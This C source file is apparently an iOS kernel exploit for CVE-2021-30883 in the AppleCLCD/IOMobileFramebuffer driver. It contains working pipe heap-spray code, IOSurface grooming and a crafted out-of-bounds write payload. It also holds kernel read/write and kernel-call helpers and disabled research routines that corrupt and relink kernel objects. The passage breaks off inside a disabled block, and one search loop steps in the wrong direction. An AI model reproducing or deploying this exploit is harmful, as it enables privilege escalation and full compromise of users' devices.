#include "exploit.h"
#include "ENABLE_HELPER.h"
#if ENABLE_HELPER
#include "helper/tfp0_krw.h"
#include "helper/offsets.h"
#include "helper/tfp0_find_port.h"
#include "helper/kutils.h"
#include "helper/kexecute.h"
#include "helper/kcall8.h"
#endif

#include "IOSurfaceRoot.h"
#include "krw.h"
#include "exploit_utilities.h"
#include "find_port.h"
#include "offsets.h"

#include <mach/mach.h>
#include <pthread.h>
#include <sys/utsname.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <stdatomic.h>
#include <string.h>
#include <CoreFoundation/CoreFoundation.h>

extern void printLog(const char *format, ...);
#define printf(...) printLog(__VA_ARGS__)

extern uint32_t gIOSurface_ids[0x4000];
extern uint32_t gIOSurface_id_count;

uint32_t gIOSurface_ids2[50] = {0, };
uint32_t gIOSurface_id_count2=0;

uint32_t kernel_page_size = 0x4000;

void spinning(void) {
    puts("Spinning here...");
    while(1) {};
}

#if ENABLE_HELPER
static kern_return_t
init_tfp0(void) {
    kern_return_t ret = task_for_pid(mach_task_self(), 0, &tfp0);
    mach_port_t host;
    pid_t pid;

    if(ret != KERN_SUCCESS) {
        host = mach_host_self();
        if(MACH_PORT_VALID(host)) {
            printf("host: 0x%" PRIx32 "\n", host);
            ret = host_get_special_port(host, HOST_LOCAL_NODE, 4, &tfp0);
            mach_port_deallocate(mach_task_self(), host);
        }
    }
    if(ret == KERN_SUCCESS && MACH_PORT_VALID(tfp0)) {
        if(pid_for_task(tfp0, &pid) == KERN_SUCCESS && pid == 0) {
            return ret;
        }
        mach_port_deallocate(mach_task_self(), tfp0);
    }
    return KERN_FAILURE;
}
#endif


io_connect_t get_iomfb_uc(void) {
    kern_return_t ret;
    io_connect_t shared_user_client_conn = MACH_PORT_NULL;
    int type = 0;
    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                       IOServiceMatching("AppleCLCD"));
    
    if(service == MACH_PORT_NULL) {
        printf("[-] failed to open service\n");
        return MACH_PORT_NULL;
    }
    
    printf("[*] AppleCLCD service: 0x%x\n", service);

    ret = IOServiceOpen(service, mach_task_self(), type, &shared_user_client_conn);
    if(ret != KERN_SUCCESS) {
        printf("[-] failed to open userclient: %s\n", mach_error_string(ret));
        return MACH_PORT_NULL;
    }
    
    printf("[*] AppleCLCD userclient: 0x%x\n", shared_user_client_conn);
    
    return shared_user_client_conn;
}

int increase_file_limit()
{
    int err = 0;
    struct rlimit rl = {};
    
    err = getrlimit(RLIMIT_NOFILE, &rl);
    if (err != 0)
    {
        return err;
    }

    rl.rlim_cur = 10240;
    rl.rlim_max = rl.rlim_cur;
    err = setrlimit(RLIMIT_NOFILE, &rl);
    if (err != 0)
    {
        return err;
    }
    
    err = getrlimit(RLIMIT_NOFILE, &rl);
    if (err != 0)
    {
        return err;
    }
    
    return 0;
}

static void set_nonblock(int fd)
{
    int flags = fcntl(fd, F_GETFL);
    flags |= O_NONBLOCK;
    fcntl(fd, F_SETFL, flags);
}

int *create_pipes(int total_pipes) {
    size_t total_pipes_size = total_pipes * 2 * sizeof(int);
    int *pipefds = malloc(total_pipes_size);
    bzero(pipefds, total_pipes_size);

    for (size_t i = 0; i < total_pipes; i++)
    {
        pipefds[i * 2] = -1;
        pipefds[i * 2 + 1] = -1;
        
        int error = pipe(&pipefds[i * 2]);
        if (error != 0 ||
            pipefds[i * 2] < 0 ||
            pipefds[i * 2 + 1] < 0)
        {
            close(pipefds[i * 2]);
            close(pipefds[i * 2 + 1]);

            total_pipes = i;
            break;
        }

        set_nonblock(pipefds[i * 2]);
        set_nonblock(pipefds[i * 2 + 1]);
    }

    return pipefds;
}

int write_data_pipes(int *pipefds, int total_pipes, void* data, size_t data_sz) {
    void *pipebuf = malloc(kernel_page_size);
    bzero(pipebuf, kernel_page_size);

    memcpy(pipebuf, (void *)data, data_sz);
    for (int i = 0; i < total_pipes; i++)
    {
        int rfd = pipefds[2 * i];
        int wfd = pipefds[2 * i + 1];
        
        if(data_sz >= 0x3f10) {
            *(uint16_t *)(pipebuf + 0x3f04) = rfd;
            *(uint16_t *)(pipebuf + 0x3f06) = wfd;
        }

        size_t written = write(wfd, pipebuf, kernel_page_size - 1);
        
        if (written != kernel_page_size - 1)
        {
            total_pipes = i;
            printf("total_pipes is now: %d", total_pipes);
            break;
        }
    }

    free(pipebuf);

    return 0;
}

int close_pipes(int *pipefds, int total_pipes, bool has_except, int krw_rfd, int krw_wfd) {
    if (pipefds)
    {
        for (int i = 0; i < total_pipes; i++)
        {
            if(has_except) {
                if(pipefds[i] == krw_rfd || pipefds[i] == krw_wfd) {
                    continue;
                }
            }
            close(pipefds[i]);
        }
    }

    return 0;
}



#if ENABLE_HELPER && PROFILLING_KHEAP_DATA_BUFFERS
int obtain_pipes_kaddr(int *pipefds, int total_pipes) {
    
    uint64_t p_fd = tfp0_kread64(proc_of_pid(getpid()) + off_p_pfd);
    printf("p_fd = 0x%llx\n", p_fd);;
    uint64_t fd_ofiles = tfp0_kread64(p_fd);
    printf("fd_ofiles = 0x%llx\n", fd_ofiles);

    uint64_t last_pipe_base = 0;

    for (int i = 0; i < total_pipes; i++) {
        int rfd = pipefds[2 * i];
        uint64_t rpipe_fp = tfp0_kread64(fd_ofiles + rfd * 8);
        uint64_t r_fp_glob = tfp0_kread64(rpipe_fp + off_fp_fglob);
        uint64_t rpipe = tfp0_kread64(r_fp_glob + off_fg_data);
        uint64_t pipe_base = tfp0_kread64(rpipe + off_pb_buffer);
        printf("KHEAP_DATA_BUFFERS KALLOCATED ADDR = 0x%llx\n", pipe_base);
        
        last_pipe_base = pipe_base;
    }

    printf("[!] Try setting macro KHEAP_DATA_MAPPABLE_LOC to 0x%llx\n", last_pipe_base - (0x4000*(total_pipes / 2)));

    return 0;
}
#endif

struct punch_args {
    mach_port_t iosurface_uc;
    uint32_t *iosurface_ids;
    size_t iosurface_id_cnt;
};

atomic_bool start_punch_hole = ATOMIC_VAR_INIT(false);
void* punch_hole(void* _arg)
{
    struct punch_args *arg = (struct punch_args *)_arg;
    if (!arg) return NULL;

    for (int32_t surf_idx = 0; surf_idx < arg->iosurface_id_cnt; surf_idx++)
    {
        if(surf_idx >= 10 && surf_idx % 100 == 0) {
            IOSurfaceRoot_release_surface(arg->iosurface_uc, arg->iosurface_ids[surf_idx]);
            printf("release, iosurf_id = 0x%x\n", arg->iosurface_ids[surf_idx]);
            arg->iosurface_ids[surf_idx] = 0;
        }
    }
    
    return NULL;
}

struct fill_args {
    mach_port_t iosurface_uc;
    uint32_t *iosurface_ids;
    size_t iosurface_id_idx;
};
void* fill_hole(void* _arg)
{
    struct fill_args *arg = (struct fill_args *)_arg;
    if (!arg) return NULL;

    arg->iosurface_ids[arg->iosurface_id_idx] = IOSurfaceRoot_create_surface_fast(arg->iosurface_uc);
    
    return NULL;
}

uint64_t find_prev_surfaceclient(uint64_t surfaceClients, uint64_t surfaceClient, int first_surfid, int last_surfid) {
    uint64_t prevSurfaceClient = 0;
    bool didFound = false;

#if ENABLE_HELPER
    for(int k = first_surfid; k <= last_surfid; k++) {
        prevSurfaceClient = tfp0_kread64(surfaceClients + k*8);
        if(prevSurfaceClient != 0) {
            uint64_t next = tfp0_kread64(prevSurfaceClient + 0x20);
            if(next == surfaceClient + 0x18) {
                return prevSurfaceClient;
            }
        }
    }
#else
    for(int k = first_surfid; k <= last_surfid; k++) {
        prevSurfaceClient = kread64(surfaceClients + k*8);
        if(prevSurfaceClient != 0) {
            uint64_t next = kread64(prevSurfaceClient + 0x20);
            if(next == surfaceClient + 0x18) {
                return prevSurfaceClient;
            }
        }
    }
#endif

    if(!didFound) return 0;
    return 0;
}

uint64_t find_next_surfaceclient(uint64_t surfaceClients, uint64_t surfaceClient, int first_surfid, int last_surfid) {
    uint64_t nextSurfaceClient = 0;
    bool didFound = false;

#if ENABLE_HELPER
    for(int k = first_surfid; k <= last_surfid; k++) {
        nextSurfaceClient = tfp0_kread64(surfaceClients + k*8);
        if(nextSurfaceClient != 0) {
            uint64_t prev = tfp0_kread64(nextSurfaceClient + 0x18);
            if(prev == surfaceClient) {
                return nextSurfaceClient;
            }
        }
    }
#else
    for(int k = first_surfid; k <= last_surfid; k++) {
        nextSurfaceClient = kread64(surfaceClients + k*8);
        if(nextSurfaceClient != 0) {
            uint64_t prev = kread64(nextSurfaceClient + 0x18);
            if(prev == surfaceClient) {
                return nextSurfaceClient;
            }
        }
    }
#endif

    if(!didFound) return 0;
    return 0;
}

uint64_t remove_surfaceclient_in_surfaceclients(uint64_t surfaceClients, uint64_t surfaceClient, int first_surfid, int last_surfid) {
#if ENABLE_HELPER
    for(int k = first_surfid; k <= last_surfid; k++) {
        uint64_t currentSurfaceClient = tfp0_kread64(surfaceClients + k*8);
        if(currentSurfaceClient == surfaceClient) {
            tfp0_kwrite64(surfaceClients + k*8, 0);
            break;
        }
    }
#else
    for(int k = first_surfid; k <= last_surfid; k++) {
        uint64_t currentSurfaceClient = kread64(surfaceClients + k*8);
        if(currentSurfaceClient == surfaceClient) {
            kwrite64(surfaceClients + k*8, 0);
            break;
        }
    }
#endif
    return 0;
}

#if 0
int test_unlink_last_IOSurfaceClient(void) {
    mach_port_t iosurface_uc = IOSurfaceRoot_init();

    uint32_t surfid = IOSurfaceRoot_create_surface_fast(iosurface_uc);
    printf("surfid = 0x%x\n", surfid);
    uint32_t surfid2 = IOSurfaceRoot_create_surface_fast(iosurface_uc);
    printf("surfid2 = 0x%x\n", surfid2);
    uint32_t surfid3 = IOSurfaceRoot_create_surface_fast(iosurface_uc);
    printf("surfid3 = 0x%x\n", surfid3);
    uint32_t surfid4 = IOSurfaceRoot_create_surface_fast(iosurface_uc);
    printf("surfid4 = 0x%x\n", surfid4);
    puts("====================");

    uint64_t IOSurfaceRootUserClient_port = tfp0_find_port(iosurface_uc);
    uint64_t IOSurfaceRootUserClient_addr = tfp0_kread64(IOSurfaceRootUserClient_port + off_ipc_port_ip_kobject);
    uint64_t surfaceClients = tfp0_kread64(IOSurfaceRootUserClient_addr + 0x118);
    printf("surfaceClients: 0x%llx\n", surfaceClients);
    puts("====================");

    uint64_t surfaceClient = tfp0_kread64(surfaceClients + surfid * 8);
    uint64_t surfaceClient2 = tfp0_kread64(surfaceClients + surfid2 * 8);
    uint64_t surfaceClient3 = tfp0_kread64(surfaceClients + surfid3 * 8);
    uint64_t surfaceClient4 = tfp0_kread64(surfaceClients + surfid4 * 8);
    printf("surfaceClient = 0x%llx\n", surfaceClient);
    printf("surfaceClient2 = 0x%llx\n", surfaceClient2);
    printf("surfaceClient3 = 0x%llx\n", surfaceClient3);
    printf("surfaceClient4 = 0x%llx\n", surfaceClient4);
    puts("====================");

    uint64_t prevSurfaceClient = find_prev_surfaceclient(surfaceClients, surfaceClient);
    uint64_t prevSurfaceClient2 = find_prev_surfaceclient(surfaceClients, surfaceClient2);
    uint64_t prevSurfaceClient3 = find_prev_surfaceclient(surfaceClients, surfaceClient3);
    uint64_t prevSurfaceClient4 = find_prev_surfaceclient(surfaceClients, surfaceClient4);

    printf("SurfaceClient's prev = 0x%llx\n", prevSurfaceClient);
    printf("SurfaceClient2's prev = 0x%llx\n", prevSurfaceClient2);
    printf("SurfaceClient3's prev = 0x%llx\n", prevSurfaceClient3);
    printf("SurfaceClient4's prev = 0x%llx\n", prevSurfaceClient4);
    puts("====================");

    uint64_t nextSurfaceClient = find_next_surfaceclient(surfaceClients, surfaceClient);
    uint64_t nextSurfaceClient2 = find_next_surfaceclient(surfaceClients, surfaceClient2);
    uint64_t nextSurfaceClient3 = find_next_surfaceclient(surfaceClients, surfaceClient3);
    uint64_t nextSurfaceClient4 = find_next_surfaceclient(surfaceClients, surfaceClient4);

    printf("SurfaceClient's next = 0x%llx\n", nextSurfaceClient);
    printf("SurfaceClient2's next = 0x%llx\n", nextSurfaceClient2);
    printf("SurfaceClient3's next = 0x%llx\n", nextSurfaceClient3);
    printf("SurfaceClient4's next = 0x%llx\n", nextSurfaceClient4);
    puts("====================");

    // Let's pretend last surfaceClient4 data has been corrupted
    for(int i = 0; i < 20; i++) {
        tfp0_kwrite64(surfaceClient4 + i*8, 0x4141414141414141);
    }

    // Let's unlink surfaceClient4 ! pretend not to be exist surfaceClient4 ;

    // Actually handle surfaceClient3
    uint64_t surfaceClientNextPtrEnd = tfp0_kread64(prevSurfaceClient4 + 0x10) + 0x108;
    printf("surfaceClientNextPtrEnd = 0x%llx\n", surfaceClientNextPtrEnd);
    tfp0_kwrite64(prevSurfaceClient4+0x20, surfaceClientNextPtrEnd);    //overwrite next ptr; 여기서 next ptr는 끝이라는 의미를 부여하기 위해 prevSurfaceClient4에서 +0x10을 읽은 커널 주소에 +0x108을 넣어 집어넣기
    tfp0_kwrite64(surfaceClientNextPtrEnd, prevSurfaceClient4);            //surfaceClientNextPtrEnd에서 prev가 surfaceClient3로 되도록 수정.

    // surfaceClients에서 surfaceClient4는 아예 지워버리기
    remove_surfaceclient_in_surfaceclients(surfaceClients, surfaceClient4);
    getchar();
}

int test_relink_IOSurfaceClient(void) {
    mach_port_t iosurface_uc = IOSurfaceRoot_init();

    uint32_t surfid = IOSurfaceRoot_create_surface_fast(iosurface_uc);
    printf("surfid = 0x%x\n", surfid);
    uint32_t surfid2 = IOSurfaceRoot_create_surface_fast(iosurface_uc);
    printf("surfid2 = 0x%x\n", surfid2);
    uint32_t surfid3 = IOSurfaceRoot_create_surface_fast(iosurface_uc);
    printf("surfid3 = 0x%x\n", surfid3);
    uint32_t surfid4 = IOSurfaceRoot_create_surface_fast(iosurface_uc);
    printf("surfid4 = 0x%x\n", surfid4);
    puts("====================");

    uint64_t IOSurfaceRootUserClient_port = tfp0_find_port(iosurface_uc);
    uint64_t IOSurfaceRootUserClient_addr = tfp0_kread64(IOSurfaceRootUserClient_port + off_ipc_port_ip_kobject);
    uint64_t surfaceClients = tfp0_kread64(IOSurfaceRootUserClient_addr + 0x118);
    printf("surfaceClients: 0x%llx\n", surfaceClients);
    puts("====================");

    uint64_t surfaceClient = tfp0_kread64(surfaceClients + surfid * 8);
    uint64_t surfaceClient2 = tfp0_kread64(surfaceClients + surfid2 * 8);
    uint64_t surfaceClient3 = tfp0_kread64(surfaceClients + surfid3 * 8);
    uint64_t surfaceClient4 = tfp0_kread64(surfaceClients + surfid4 * 8);
    printf("surfaceClient = 0x%llx\n", surfaceClient);
    printf("surfaceClient2 = 0x%llx\n", surfaceClient2);
    printf("surfaceClient3 = 0x%llx\n", surfaceClient3);
    printf("surfaceClient4 = 0x%llx\n", surfaceClient4);
    puts("====================");

    uint64_t prevSurfaceClient = find_prev_surfaceclient(surfaceClients, surfaceClient);
    uint64_t prevSurfaceClient2 = find_prev_surfaceclient(surfaceClients, surfaceClient2);
    uint64_t prevSurfaceClient3 = find_prev_surfaceclient(surfaceClients, surfaceClient3);
    uint64_t prevSurfaceClient4 = find_prev_surfaceclient(surfaceClients, surfaceClient4);

    printf("SurfaceClient's prev = 0x%llx\n", prevSurfaceClient);
    printf("SurfaceClient2's prev = 0x%llx\n", prevSurfaceClient2);
    printf("SurfaceClient3's prev = 0x%llx\n", prevSurfaceClient3);
    printf("SurfaceClient4's prev = 0x%llx\n", prevSurfaceClient4);
    puts("====================");

    uint64_t nextSurfaceClient = find_next_surfaceclient(surfaceClients, surfaceClient);
    uint64_t nextSurfaceClient2 = find_next_surfaceclient(surfaceClients, surfaceClient2);
    uint64_t nextSurfaceClient3 = find_next_surfaceclient(surfaceClients, surfaceClient3);
    uint64_t nextSurfaceClient4 = find_next_surfaceclient(surfaceClients, surfaceClient4);

    printf("SurfaceClient's next = 0x%llx\n", nextSurfaceClient);
    printf("SurfaceClient2's next = 0x%llx\n", nextSurfaceClient2);
    printf("SurfaceClient3's next = 0x%llx\n", nextSurfaceClient3);
    printf("SurfaceClient4's next = 0x%llx\n", nextSurfaceClient4);
    puts("====================");

    // Let's pretend surfaceClient3 data has been corrupted
    for(int i = 0; i < 20; i++) {
        tfp0_kwrite64(surfaceClient3 + i*8, 0x4141414141414141);
    }

    // Let's unlink surfaceClient3 ! pretend not to be exist surfaceClient3 ;
    // Actually handle surfaceClient2
    tfp0_kwrite64(prevSurfaceClient3+0x20, nextSurfaceClient3+0x18);    //overwrite next ptr; surfaceClient2 다음으로 surfaceClient4로 가리키게 만들기

    // Actually handle surfaceClient4
    tfp0_kwrite64(nextSurfaceClient3+0x18, prevSurfaceClient3);    //overwrite prev ptr; surfaceClient4 이전으로는 surfaceClient2로 가리키게 만들기

    // surfaceClients에서 surfaceClient3는 아예 지워버리기
    remove_surfaceclient_in_surfaceclients(surfaceClients, surfaceClient3);

    #if 0
    khexdump 0xffffffe4cbfbf000 300
    tfp0: 0xb03
    get_kbase ret: 0, kbase: 0xfffffff029e28000
    0xffffffe4cbfbf000: 0x0000000000000000 0x0000000000000000
    0xffffffe4cbfbf010: 0x0000000000000000 0x0000000000000000
    0xffffffe4cbfbf020: 0x0000000000000000 0x0000000000000000
    0xffffffe4cbfbf030: 0x0000000000000000 0x0000000000000000
    0xffffffe4cbfbf040: 0x0000000000000000 0x0000000000000000
    0xffffffe4cbfbf050: 0x0000000000000000 0x0000000000000000
    0xffffffe4cbfbf060: 0x0000000000000000 0x0000000000000000
    0xffffffe4cbfbf070: 0x0000000000000000 0x0000000000000000
    0xffffffe4cbfbf080: 0x0000000000000000 0x0000000000000000
    0xffffffe4cbfbf090: 0x0000000000000000 0x0000000000000000
    0xffffffe4cbfbf0a0: 0x0000000000000000 0x0000000000000000
    0xffffffe4cbfbf0b0: 0x0000000000000000 0x0000000000000000
    0xffffffe4cbfbf0c0: 0x0000000000000000 0x0000000000000000
    0xffffffe4cbfbf0d0: 0x0000000000000000 0x0000000000000000
    0xffffffe4cbfbf0e0: 0x0000000000000000 0x0000000000000000
    0xffffffe4cbfbf0f0: 0xffffffe4cc2f6bc0 0xffffffe4cc1dfe80
    0xffffffe4cbfbf100: 0xffffffe4cc0ee580 0x0000000000000000
    0xffffffe4cbfbf110: 0x0000000000000000 0x0000000000000000
    0xffffffe4cbfbf120: 0x0000000000000000 0x0000000000000000

    surfid
    khexdump 0xffffffe4cc2f6bc0
    tfp0: 0x1403
    get_kbase ret: 0, kbase: 0xfffffff029e28000
    0xffffffe4cc2f6bc0: 0xfffffff02a689a18 0x0000000000000001
    0xffffffe4cc2f6bd0: 0xffffffe4cbfe82e0 0x0000000000000000 (prev)
    0xffffffe4cc2f6be0: 0xffffffe4cc1dfe98(next) 0x0000000000000000
    0xffffffe4cc2f6bf0: 0xffffffe19e6b3340 0x000000000000001e
    0xffffffe4cc2f6c00: 0xffffffe19e6b3000 0xffffffe19f387560
    0xffffffe4cc2f6c10: 0x0000000102f48000 0x0000000102f404d0
    0xffffffe4cc2f6c20: 0x0000000102f44780 0x0000000000000000
    0xffffffe4cc2f6c30: 0x0000000000000001 0x0000000000000000
    0xffffffe4cc2f6c40: 0x0000000000000000 0x0000000000000000
    0xffffffe4cc2f6c50: 0x0000000000000000 0x0000000000000000
    0xffffffe4cc2f6c60: 0xfffffff02a6f3528 0x8010000100010001
    0xffffffe4cc2f6c70: 0x0000000000000001 0x0000000100000415
    0xffffffe4cc2f6c80: 0xffffffe4ccaf6800 0xffffffe4cc2af240
    0xffffffe4cc2f6c90: 0x0000001000000001 0x0000000000000010
    0xffffffe4cc2f6ca0: 0xffffffe19f3e4168 0x0000000000000000
    0xffffffe4cc2f6cb0: 0x0000000000000000 0x0000000000000000

    surfid2
    khexdump 0xffffffe4cc1dfe80
    tfp0: 0x1303
    get_kbase ret: 0, kbase: 0xfffffff029e28000
    0xffffffe4cc1dfe80: 0xfffffff02a689a18 0x0000000000000001
    0xffffffe4cc1dfe90: 0xffffffe4cbfe82e0 0xffffffe4cc2f6bc0
    0xffffffe4cc1dfea0: 0xffffffe4cc0ee598 0x0000000000000000
    0xffffffe4cc1dfeb0: 0xffffffe19e6b3740 0x000000000000001f
    0xffffffe4cc1dfec0: 0xffffffe19e6b3400 0xffffffe19f3847e0
    0xffffffe4cc1dfed0: 0x0000000102f4c000 0x0000000102f40580
    0xffffffe4cc1dfee0: 0x0000000102f447c0 0x0000000000000000
    0xffffffe4cc1dfef0: 0x0000000000000001 0x0000000000000000
    0xffffffe4cc1dff00: 0x0000000000000000 0x0000000000000000
    0xffffffe4cc1dff10: 0x0000000000000000 0x0000000000000000
    0xffffffe4cc1dff20: 0x000000ff00000000 0x000000ff000000ff
    0xffffffe4cc1dff30: 0x000000ff000000ff 0x000000ff000000ff
    0xffffffe4cc1dff40: 0x000000ff000000ff 0x000000ff000000ff
    0xffffffe4cc1dff50: 0x000000ff000000ff 0x000000ff000000ff
    0xffffffe4cc1dff60: 0x000000ff00000000 0x000000ff000000ff
    0xffffffe4cc1dff70: 0x000000ff000000ff 0x000000ff000000ff

    surfid3
    khexdump 0xffffffe4cc0ee580
    tfp0: 0x1203
    get_kbase ret: 0, kbase: 0xfffffff029e28000
    0xffffffe4cc0ee580: 0xfffffff02a689a18 0x0000000000000001
    0xffffffe4cc0ee590: 0xffffffe4cbfe82e0 0xffffffe4cc1dfe80
    0xffffffe4cc0ee5a0: 0xffffffe4cbfe83e8 0x0000000000000000
    0xffffffe4cc0ee5b0: 0xffffffe19e6b0b40 0x0000000000000020
    0xffffffe4cc0ee5c0: 0xffffffe19e6b0800 0xffffffe19fde59d0
    0xffffffe4cc0ee5d0: 0x0000000102f50000 0x0000000102f40630
    0xffffffe4cc0ee5e0: 0x0000000102f44800 0x0000000000000000
    0xffffffe4cc0ee5f0: 0x0000000000000001 0x0000000000000000
    0xffffffe4cc0ee600: 0x0000000000000000 0x0000000000000000
    0xffffffe4cc0ee610: 0x0000000000000000 0x0000000000000000
    0xffffffe4cc0ee620: 0x000000ff00000000 0x000000ff000000ff
    0xffffffe4cc0ee630: 0x000000ff000000ff 0x000000ff000000ff
    0xffffffe4cc0ee640: 0x000000ff000000ff 0x000000ff000000ff
    0xffffffe4cc0ee650: 0x000000ff000000ff 0x000000ff000000ff
    0xffffffe4cc0ee660: 0x000000ff00000000 0x000000ff000000ff
    0xffffffe4cc0ee670: 0x000000ff000000ff 0x000000ff000000ff
#endif
    
    

    getchar();
}

uint64_t kcall8_IOMallocZero_external(uint64_t size) {
    uint64_t addr = tfp0_kcall8(ksym(KSYMBOL_IOMallocZero_external), size, 0, 0, 0, 0, 0, 0, 0);
    return addr;
}

uint64_t kcall8_kalloc_ext_KHEAP_KEXT(uint64_t req_size) {
    return tfp0_kcall8(ksym(KSYMBOL_KALLOC_EXT), ksym(KSYMBOL_KHEAP_KEXT), req_size, 0, ksym(KSYMBOL__necp_set_socket_attributes_site), 0, 0, 0, 0);
}

uint64_t kcall8_kfree(uint64_t addr, uint64_t size) {
    return tfp0_kcall8(ksym(KSYMBOL_KFREE), addr, size, 0, 0, 0, 0, 0, 0);
}

int research_zone_poisoning(void) {
    mach_port_t iosurface_uc = IOSurfaceRoot_init();

    uint32_t surfid = IOSurfaceRoot_create_surface_fast(iosurface_uc);
    printf("surfid = 0x%x\n", surfid);
    uint32_t surfid2 = IOSurfaceRoot_create_surface_fast(iosurface_uc);
    printf("surfid2 = 0x%x\n", surfid2);
    uint32_t surfid3 = IOSurfaceRoot_create_surface_fast(iosurface_uc);
    printf("surfid3 = 0x%x\n", surfid3);
    uint32_t surfid4 = IOSurfaceRoot_create_surface_fast(iosurface_uc);
    printf("surfid4 = 0x%x\n", surfid4);
    puts("====================");

    uint64_t IOSurfaceRootUserClient_port = tfp0_find_port(iosurface_uc);
    uint64_t IOSurfaceRootUserClient_addr = tfp0_kread64(IOSurfaceRootUserClient_port + off_ipc_port_ip_kobject);
    uint64_t surfaceClients = tfp0_kread64(IOSurfaceRootUserClient_addr + 0x118);
    printf("surfaceClients: 0x%llx\n", surfaceClients);
    puts("====================");

    uint64_t surfaceClient = tfp0_kread64(surfaceClients + surfid * 8);
    uint64_t surfaceClient2 = tfp0_kread64(surfaceClients + surfid2 * 8);
    uint64_t surfaceClient3 = tfp0_kread64(surfaceClients + surfid3 * 8);
    uint64_t surfaceClient4 = tfp0_kread64(surfaceClients + surfid4 * 8);
    printf("surfaceClient = 0x%llx\n", surfaceClient);
    printf("surfaceClient2 = 0x%llx\n", surfaceClient2);
    printf("surfaceClient3 = 0x%llx\n", surfaceClient3);
    printf("surfaceClient4 = 0x%llx\n", surfaceClient4);
    puts("====================");

    IOSurfaceRoot_release_surface(iosurface_uc, surfid2);
    IOSurfaceRoot_release_surface(iosurface_uc, surfid4);

    uint64_t zp_poisoned_cookie = tfp0_kread64(tfp0_kslide + 0xFFFFFFF007711338);
    printf("zp_poisoned_cookie = 0x%llx\n", zp_poisoned_cookie);

    uint64_t zp_nopoison_cookie = tfp0_kread64(tfp0_kslide + 0xFFFFFFF007711330);
    printf("zp_nopoison_cookie = 0x%llx\n", zp_nopoison_cookie);

    getchar();

    return 0;
}

int research_iosurfaceclients_allocation(void) {

    mach_port_t iosurface_ucs[10];
    iosurface_ucs[0] = IOSurfaceRoot_init();
    iosurface_ucs[1] = IOSurfaceRoot_init();
    iosurface_ucs[2] = IOSurfaceRoot_init();
    iosurface_ucs[3] = IOSurfaceRoot_init();

    for (int i = 0; i < 0x1000; ++i)
    {
        uint32_t last_id = IOSurfaceRoot_create_surface_fast(iosurface_ucs[0]);
        if ((0x3400) <= (last_id * sizeof(uint64_t)))
        {
            break;
        }
    }
    for (int i = 0; i < 0x1000; ++i)
    {
        uint32_t last_id = IOSurfaceRoot_create_surface_fast(iosurface_ucs[1]);
        if ((0x3400*2) <= (last_id * sizeof(uint64_t)))
        {
            break;
        }
    }
    for (int i = 0; i < 0x1000; ++i)
    {
        uint32_t last_id = IOSurfaceRoot_create_surface_fast(iosurface_ucs[2]);
        if ((0x3400*3) <= (last_id * sizeof(uint64_t)))
        {
            break;
        }
    }
    for (int i = 0; i < 0x1000; ++i)
    {
        uint32_t last_id = IOSurfaceRoot_create_surface_fast(iosurface_ucs[3]);
        if ((0x3400*4) <= (last_id * sizeof(uint64_t)))
        {
            break;
        }
    }

    // IOSurfaceRoot_release_all(iosurface_uc);

    return 0;
}
#endif

int find_first_surfaceid(void) {
    for(int i = 0; i < gIOSurface_id_count; i++) {
        if(gIOSurface_ids[i] != 0)
            return gIOSurface_ids[i];
    }
    return -1;
}

int find_last_surfaceid(void) {
    for(int i = gIOSurface_id_count-1; i >= 0; i++) {
        if(gIOSurface_ids[i] != 0)
            return gIOSurface_ids[i];
    }
    return -1;
}

int exploit(void) {
    offsets_init();

#if ENABLE_HELPER
    if(init_tfp0() == KERN_SUCCESS) {
        printf("tfp0: 0x%" PRIx32 "\n", tfp0);

        int r = tfp0_get_kbase(&tfp0_kbase);
        printf("tfp0_get_kbase ret: %d, tfp0_kbase: 0x%llx, tfp0_kslide: 0x%llx\n", r, tfp0_kbase, tfp0_kslide);

        init_kexecute();
#endif

#if ENABLE_HELPER
    // test_relink_IOSurfaceClient();
    // test_unlink_last_IOSurfaceClient();
    // research_zone_poisoning();
    // research_iosurfaceclients_allocation();

    goto cleanup;
#endif


    increase_file_limit();
#if ENABLE_HELPER && PROFILLING_KHEAP_DATA_BUFFERS
    int total_pipes_ = 0x320;
    int *pipefds_ = create_pipes(total_pipes_);

    void *pipe_data_ = malloc(kernel_page_size);
    memset(pipe_data_, 0x42, kernel_page_size);
    write_data_pipes(pipefds_, total_pipes_, pipe_data_, kernel_page_size);

    obtain_pipes_kaddr(pipefds_, total_pipes_);

    close_pipes(pipefds_, total_pipes_, false, 0, 0);

    goto cleanup;
#endif
    printf("Exploiting CVE-2021-30883 (first journey from poc to exploit by @wh1te4ever!)\n");

    // pipe spray
    int total_pipes = 0x320;
    int *pipefds = create_pipes(total_pipes);

    void *pipe_data = malloc(kernel_page_size);
    memset(pipe_data, 0x42, kernel_page_size);

    *(uint64_t *)(pipe_data + 0x10 + 0xC0) = (KHEAP_DATA_MAPPABLE_LOC + 0x3f04) - 0x14; //will be read by IOSurface::get_use_count, will read data from kernel addr(KHEAP_DATA_MAPPABLE_LOC + 0x2000)

    write_data_pipes(pipefds, total_pipes, pipe_data, kernel_page_size);

    // iosurface & iomfb
    mach_port_t iosurface_ucs[3];
    iosurface_ucs[0] = IOSurfaceRoot_init();
    iosurface_ucs[1] = IOSurfaceRoot_init();
    iosurface_ucs[2] = IOSurfaceRoot_init();

    mach_port_t iosurface_uc = IOSurfaceRoot_init();
    io_connect_t iomfb_uc = get_iomfb_uc();

    #if ENABLE_HELPER
        uint64_t IOSurfaceRootUserClient_port_ = tfp0_find_port(iosurface_uc);
        uint64_t IOSurfaceRootUserClient_addr_ = tfp0_kread64(IOSurfaceRootUserClient_port_ + off_ipc_port_ip_kobject);
        uint64_t surfaceClients_ = tfp0_kread64(IOSurfaceRootUserClient_addr_ + 0x118);
    #endif

    //trigger oob write for kext.kalloc.160
    //Thanks @AmarSaar for providing detail write-up and poc; https://github.com/saaramar/IOMFB_integer_overflow_poc
    kern_return_t ret = KERN_SUCCESS;
    size_t input_size = 0x180;
    
    uint64_t scalars[2] = { 0 };

    char *input = (char*)malloc(input_size);
    memset(input, 0x41, input_size);

    *(uint64_t *)(input + 0x150) = 0x8182838400000000 + ((KHEAP_DATA_MAPPABLE_LOC+0x10) & 0xffffffff);
    *(uint64_t *)(input + 0x158) = 0x1337133813391340;
    *(uint64_t *)(input + 0x154) = KHEAP_DATA_MAPPABLE_LOC+0x10;    // to control IOSurface ptr

#if 0
    *(uint64_t *)(input + 0x150) = 0x8182838485868788;
    *(uint64_t *)(input + 0x158) = 0x1337133813391340;    // to control IOSurface ptr

